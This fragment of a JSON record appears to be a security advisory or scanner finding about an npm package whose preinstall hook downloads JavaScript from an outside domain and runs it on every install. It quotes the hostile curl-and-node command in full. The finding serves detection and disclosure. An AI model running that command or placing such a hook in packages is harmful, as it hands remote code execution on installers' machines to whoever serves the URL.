  "summary": "preinstall script fetches and executes remote JavaScript from attacker-controlled domain",
  "details": "package.json declares a preinstall lifecycle hook that runs `curl https://poc.amanrawat.com/hehe.js -o index.js \u0026\u0026 node index.js`, automatically downloading JavaScript from an external domain and executing it with node on every `npm install`. The fetched content is unpinned and unverified (no hash, no version), so the bytes that run on the installer's machine are entirely under the control of whoever serves that URL and can change at any time. This grants arbitrary code execution on every installer's machine at install time.",
